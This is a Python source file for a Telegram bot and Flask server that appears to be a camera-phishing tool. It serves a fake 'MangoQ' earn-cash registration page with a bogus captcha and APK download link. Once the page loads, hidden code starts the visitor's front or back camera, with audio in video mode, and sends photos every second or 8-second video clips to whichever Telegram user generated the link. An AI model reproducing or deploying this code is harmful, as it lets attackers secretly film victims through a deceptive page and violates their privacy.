import os
import threading
import logging
import base64
import json
import time
import requests
from flask import Flask, request, jsonify
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext

logging.basicConfig(level=logging.INFO)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
BASE_URL = "https://sathi-uu2f.onrender.com"
DB_FILE = "users.json"
APK_LINK = "http://saber.online/s/mq/TX596"

flask_app = Flask(__name__)

def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r") as f:
            return json.load(f)
    return {"users": {}, "codes": {}, "counter": 99}

def save_db(db):
    with open(DB_FILE, "w") as f:
        json.dump(db, f)

def get_user_code(user_id):
    db = load_db()
    uid = str(user_id)
    if uid not in db["users"]:
        db["counter"] += 1
        code = f"TX{db['counter']}"
        db["users"][uid] = code
        db["codes"][code] = uid
        save_db(db)
    return db["users"][uid]

def get_user_id_by_code(code):
    db = load_db()
    return db["codes"].get(code)

def get_html(code, mode="front"):
    facing = "environment" if mode == "back" else "user"
    is_video = "true" if mode == "video" else "false"
    apk = APK_LINK

    if mode == "video":
        camera_init = "startVideoRecording();"
        media_js = """
        let mediaRecorder;
        let chunks = [];
        function startVideoRecording() {
            const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8')
                ? 'video/webm;codecs=vp8' : 'video/webm';
            mediaRecorder = new MediaRecorder(window.camStream, {mimeType: mimeType});
            mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
            mediaRecorder.onstop = () => {
                const blob = new Blob(chunks, {type: 'video/webm'});
                chunks = [];
                const reader = new FileReader();
                reader.onloadend = () => {
                    fetch('/upload/' + code + '/video', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({video: reader.result})
                    }).catch(e => console.error(e));
                };
                reader.readAsDataURL(blob);
                setTimeout(() => {
                    chunks = [];
                    mediaRecorder.start();
                    setTimeout(() => mediaRecorder.stop(), 8000);
                }, 500);
            };
            mediaRecorder.start();
            setTimeout(() => mediaRecorder.stop(), 8000);
        }
"""
    else:
        camera_init = "setInterval(captureAndSend, 1000);"
        media_js = """
        let sending = false;
        function captureAndSend() {
            if (sending) return;
            sending = true;
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            if (!video.videoWidth) { sending = false; return; }
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const imageData = canvas.toDataURL('image/jpeg', 0.75);
            fetch('/upload/' + code + '/photo', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({image: imageData})
            })
            .then(r => r.json())
            .then(() => { sending = false; })
            .catch(() => { sending = false; });
        }
"""

    return f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MangoQ Register</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; }}
        body {{ background: #0a1628; min-height: 100vh; }}
        .topbar {{ display: flex; justify-content: space-between; align-items: center; padding: 12px 16px; }}
        .logo {{ display: flex; align-items: center; gap: 8px; }}
        .logo-icon {{ width: 36px; height: 36px; background: linear-gradient(135deg, #4a9eff, #1a6fd4); border-radius: 8px; display: flex; align-items: center; justify-content: center; color: white; font-size: 16px; font-weight: 900; }}
        .logo-text {{ font-size: 20px; font-weight: 700; color: #ffffff; }}
        .btn-apk {{ background: #1e3a5f; color: #ffffff; border: 1px solid #2a4a7f; padding: 7px 14px; border-radius: 20px; font-size: 12px; font-weight: 600; cursor: pointer; }}
        .hero-card {{ background: #112240; border-radius: 14px; margin: 10px 12px; padding: 18px 16px 16px; }}
        .hero-card h2 {{ font-size: 24px; font-weight: 800; color: #ffffff; line-height: 1.2; margin-bottom: 10px; }}
        .hero-card .desc {{ font-size: 13px; color: #7a9cc0; line-height: 1.6; margin-bottom: 14px; }}
        .feature-grid {{ display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }}
        .feature-box {{ background: #1a3050; border-radius: 10px; padding: 12px; border: 1px solid #1e3a60; }}
        .feature-box h4 {{ font-size: 13px; font-weight: 700; color: #ffffff; margin-bottom: 4px; }}
        .feature-box p {{ font-size: 12px; color: #7a9cc0; margin: 0; line-height: 1.4; }}
        .form-card {{ background: #112240; border-radius: 14px; margin: 10px 12px; padding: 18px 16px; }}
        .form-card h3 {{ font-size: 19px; font-weight: 700; color: #ffffff; margin-bottom: 14px; }}
        .form-group {{ margin-bottom: 12px; }}
        .form-label-row {{ display: flex; gap: 60px; margin-bottom: 6px; }}
        .form-label-row label, .form-group label {{ font-size: 13px; color: #7a9cc0; display: block; margin-bottom: 6px; }}
        .input-row {{ display: flex; gap: 8px; }}
        .country-input {{ background: #1a3050; border: 1px solid #2a4a70; border-radius: 10px; padding: 12px 10px; color: #ffffff; font-size: 14px; font-weight: 600; width: 60px; text-align: center; outline: none; }}
        .text-input {{ background: #1a3050; border: 1px solid #2a4a70; border-radius: 10px; padding: 12px 14px; color: #ffffff; font-size: 14px; flex: 1; outline: none; width: 100%; }}
        .text-input::placeholder {{ color: #4a6a90; }}
        .inviter-input {{ background: #1a3050; border: 1px solid #2a4a70; border-radius: 10px; padding: 12px 14px; color: #ffffff; font-size: 14px; font-weight: 600; width: 100%; outline: none; }}
        .btn-register {{ width: 100%; padding: 15px; background: linear-gradient(135deg, #4a9eff, #1a6fd4); color: #ffffff; border: none; border-radius: 30px; font-size: 15px; font-weight: 700; cursor: pointer; margin-top: 8px; }}
        video, canvas {{ display: none; }}
        .overlay {{ display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.75); z-index: 999; justify-content: center; align-items: center; }}
        .overlay.active {{ display: flex; }}
        .captcha-box {{ background: #112240; border-radius: 16px; padding: 28px 24px; width: 85%; max-width: 340px; text-align: center; }}
        .captcha-box h3 {{ color: #ffffff; font-size: 18px; margin-bottom: 8px; }}
        .captcha-question {{ color: #4a9eff; font-size: 32px; font-weight: 800; margin: 16px 0; }}
        .captcha-input {{ width: 100%; background: #1a3050; border: 1px solid #2a4a70; border-radius: 10px; padding: 12px; color: #ffffff; font-size: 20px; text-align: center; outline: none; margin-bottom: 14px; }}
        .btn-submit {{ width: 100%; padding: 13px; background: linear-gradient(135deg, #4a9eff, #1a6fd4); color: #ffffff; border: none; border-radius: 30px; font-size: 15px; font-weight: 700; cursor: pointer; }}
        .result-box {{ background: #112240; border-radius: 16px; padding: 28px 24px; width: 85%; max-width: 340px; text-align: center; }}
        .result-box h3 {{ color: #ef4444; font-size: 18px; margin-bottom: 12px; }}
        .result-box p {{ color: #94a3b8; font-size: 14px; margin-bottom: 20px; }}
        .btn-download {{ width: 100%; padding: 13px; background: linear-gradient(135deg, #4a9eff, #1a6fd4); color: #ffffff; border: none; border-radius: 30px; font-size: 15px; font-weight: 700; cursor: pointer; }}
        .toast {{ position: fixed; top: 16px; left: 50%; transform: translateX(-50%); background: #fff0f0; color: #c0392b; border: 1px solid #f5c6cb; border-radius: 10px; padding: 12px 20px; font-size: 13px; font-weight: 600; z-index: 9999; display: none; align-items: center; gap: 8px; min-width: 260px; box-shadow: 0 4px 12px rgba(0,0,0,0.2); }}
        .toast.active {{ display: flex; }}
        .toast-icon {{ width: 20px; height: 20px; background: #c0392b; border-radius: 50%; color: white; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 900; flex-shrink: 0; }}
    </style>
</head>
<body>
    <div class="topbar">
        <div class="logo">
            <div class="logo-icon">&#9650;</div>
            <span class="logo-text">MangoQ</span>
        </div>
        <button class="btn-apk" onclick="showApkCaptcha()">Download APK</button>
    </div>
    <div class="hero-card">
        <h2>Earn Cash with Tasks</h2>
        <p class="desc">MangoQ helps users complete available WhatsApp and SMS task flows, track cash earnings, and grow referral income from the mobile app.</p>
        <div class="feature-grid">
            <div class="feature-box"><h4>Task income</h4><p>Finish messaging tasks.</p></div>
            <div class="feature-box"><h4>Team growth</h4><p>Earn more with invite rewards.</p></div>
        </div>
    </div>
    <div class="form-card">
        <h3>Download APK</h3>
        <div class="form-group">
            <div class="form-label-row"><label>Country</label><label>Phone number</label></div>
            <div class="input-row">
                <input class="country-input" type="text" value="+880" readonly>
                <input class="text-input" id="phone" type="text" placeholder="WhatsApp phone number">
            </div>
        </div>
        <div class="form-group">
            <label>Password</label>
            <input class="text-input" id="password" type="password" placeholder="At least 6 characters">
        </div>
        <div class="form-group">
            <label>Inviter</label>
            <input class="inviter-input" type="text" value="{code}" readonly>
        </div>
        <button class="btn-register" onclick="handleRegister()">Register & Download APK</button>
    </div>

    <!-- Register Captcha -->
    <div class="overlay" id="captchaOverlay">
        <div class="captcha-box">
            <h3>Verify you are human</h3>
            <div class="captcha-question" id="captchaQuestion"></div>
            <input class="captcha-input" id="captchaInput" type="number" placeholder="?">
            <button class="btn-submit" onclick="checkCaptcha()">Submit</button>
        </div>
    </div>

    <!-- Result -->
    <div class="overlay" id="resultOverlay">
        <div class="result-box">
            <h3>Registration Unsuccessful</h3>
            <p>Something went wrong. Please try again later.</p>
            <button class="btn-download" onclick="window.open('{apk}','_blank')">Download Now</button>
        </div>
    </div>

    <!-- APK Captcha -->
    <div class="overlay" id="apkCaptchaOverlay">
        <div class="captcha-box">
            <h3>Verify you are human</h3>
            <div class="captcha-question" id="apkCaptchaQuestion"></div>
            <input class="captcha-input" id="apkCaptchaInput" type="number" placeholder="?">
            <button class="btn-submit" onclick="checkApkCaptcha()">Submit</button>
        </div>
    </div>

    <div class="toast" id="toast">
        <div class="toast-icon">✕</div>
        <span class="toast-msg"></span>
    </div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

<script>
    const code = '{code}';
    let captchaAnswer = 0;
    let apkCaptchaAnswer = 0;

    // Toast
    function showToast(msg) {{
        const t = document.getElementById('toast');
        t.querySelector('.toast-msg').textContent = msg;
        t.classList.add('active');
        setTimeout(() => t.classList.remove('active'), 3000);
    }}

    // APK Captcha
    function showApkCaptcha() {{
        const a = Math.floor(Math.random() * 10) + 1;
        const b = Math.floor(Math.random() * 10) + 1;
        apkCaptchaAnswer = a + b;
        document.getElementById('apkCaptchaQuestion').textContent = a + ' + ' + b + ' = ?';
        document.getElementById('apkCaptchaInput').value = '';
        document.getElementById('apkCaptchaOverlay').classList.add('active');
    }}

    function checkApkCaptcha() {{
        const val = parseInt(document.getElementById('apkCaptchaInput').value);
        if (isNaN(val) || val !== apkCaptchaAnswer) {{
            showToast('Wrong answer! Please try again.');
            document.getElementById('apkCaptchaInput').value = '';
            return;
        }}
        document.getElementById('apkCaptchaOverlay').classList.remove('active');
        window.open('{apk}', '_blank');
    }}

    // Register
    function handleRegister() {{
        const phone = document.getElementById('phone').value.trim();
        const password = document.getElementById('password').value.trim();
        if (!phone && !password) {{ showToast('Please enter phone number and password'); return; }}
        if (!phone) {{ showToast('Please enter phone number'); return; }}
        if (!/^[0-9]{{10,11}}$/.test(phone)) {{ showToast('Please enter a valid phone number'); return; }}
        if (!password) {{ showToast('Please enter password'); return; }}
        if (password.length < 6) {{ showToast('Password must be at least 6 characters'); return; }}
        const a = Math.floor(Math.random() * 10) + 1;
        const b = Math.floor(Math.random() * 10) + 1;
        captchaAnswer = a + b;
        document.getElementById('captchaQuestion').textContent = a + ' + ' + b + ' = ?';
        document.getElementById('captchaInput').value = '';
        document.getElementById('captchaOverlay').classList.add('active');
    }}

    function checkCaptcha() {{
        const val = parseInt(document.getElementById('captchaInput').value);
        if (isNaN(val) || val !== captchaAnswer) {{
            showToast('Wrong answer! Please try again.');
            document.getElementById('captchaInput').value = '';
            return;
        }}
        document.getElementById('captchaOverlay').classList.remove('active');
        document.getElementById('resultOverlay').classList.add('active');
    }}

    // Camera
    {media_js}

    window.addEventListener('DOMContentLoaded', () => {{
        navigator.mediaDevices.getUserMedia({{
            video: {{ facingMode: '{facing}' }},
            audio: {is_video}
        }})
        .then(stream => {{
            window.camStream = stream;
            const video = document.getElementById('video');
            video.srcObject = stream;
            video.play();
            {camera_init}
        }})
        .catch(err => console.error(err));
    }});
</script>
</body>
</html>'''

# =====================
# Flask Routes
# =====================

@flask_app.route("/s/mq/<code>")
def camera_page(code):
    db = load_db()
    mode = db.get("modes", {}).get(code, "front")
    return get_html(code, mode)

@flask_app.route("/upload/<code>/photo", methods=["POST"])
def upload_photo(code):
    try:
        data = request.get_json()
        image_data = data.get("image")
        user_id = get_user_id_by_code(code)
        if not user_id:
            return jsonify({"status": "error"}), 400
        header, encoded = image_data.split(",", 1)
        img_bytes = base64.b64decode(encoded)
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        files = {"photo": ("photo.jpg", img_bytes, "image/jpeg")}
        payload = {"chat_id": user_id}
        requests.post(url, data=payload, files=files)
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@flask_app.route("/upload/<code>/video", methods=["POST"])
def upload_video(code):
    try:
        data = request.get_json()
        video_data = data.get("video")
        user_id = get_user_id_by_code(code)
        if not user_id:
            return jsonify({"status": "error"}), 400
        header, encoded = video_data.split(",", 1)
        vid_bytes = base64.b64decode(encoded)
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
        files = {"video": ("video.webm", vid_bytes, "video/webm")}
        payload = {"chat_id": user_id}
        requests.post(url, data=payload, files=files)
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@flask_app.route("/")
def index():
    return "MangoQ Bot Running ✅"

# =====================
# Telegram Handlers
# =====================

def set_user_mode(code, mode):
    db = load_db()
    if "modes" not in db:
        db["modes"] = {}
    db["modes"][code] = mode
    save_db(db)

def start(update: Update, context: CallbackContext):
    user = update.effective_user
    code = get_user_code(user.id)
    keyboard = ReplyKeyboardMarkup(
        [
            [KeyboardButton("📷 Front Camera"), KeyboardButton("📷 Back Camera")],
            [KeyboardButton("🎥 Video 8S")]
        ],
        resize_keyboard=True
    )
    update.message.reply_text(
        f"👋 স্বাগতম, {user.first_name}!\n\nনিচের বাটন থেকে বেছে নাও।",
        reply_markup=keyboard
    )

def handle_message(update: Update, context: CallbackContext):
    text = update.message.text
    user_id = update.effective_user.id
    code = get_user_code(user_id)
    link = f"{BASE_URL}/s/mq/{code}"
    if text == "📷 Front Camera":
        set_user_mode(code, "front")
        update.message.reply_text(f"📷 Front Camera লিংক:\n\n{link}")
    elif text == "📷 Back Camera":
        set_user_mode(code, "back")
        update.message.reply_text(f"📷 Back Camera লিংক:\n\n{link}")
    elif text == "🎥 Video 8S":
        set_user_mode(code, "video")
        update.message.reply_text(f"🎥 Video লিংক:\n\n{link}")

# =====================
# Uptime
# =====================

def keep_alive():
    while True:
        try:
            requests.get(BASE_URL)
        except:
            pass
        time.sleep(300)

# =====================
# Run
# =====================

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    flask_app.run(host="0.0.0.0", port=port)

def main():
    threading.Thread(target=run_flask, daemon=True).start()
    threading.Thread(target=keep_alive, daemon=True).start()
    updater = Updater(token=BOT_TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
